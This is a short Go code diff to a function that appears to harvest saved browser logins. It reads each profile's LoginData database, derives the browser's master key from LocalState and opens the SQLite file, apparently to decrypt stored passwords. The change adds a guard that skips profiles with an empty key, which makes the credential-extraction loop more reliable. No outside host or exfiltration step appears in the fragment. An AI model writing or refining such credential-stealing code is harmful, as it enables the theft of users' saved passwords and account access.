@@ -24,6 +24,9 @@ func Get(browsersList []structs.Browser) string {
 			path := profile.LoginData
 
 			master_key := decryption.GetMasterKey(browser.LocalState)
+			if len(master_key) == 0 {
+				continue
+			}
 			db, err := sql.Open("sqlite3", path)
 			if err != nil {
 				continue
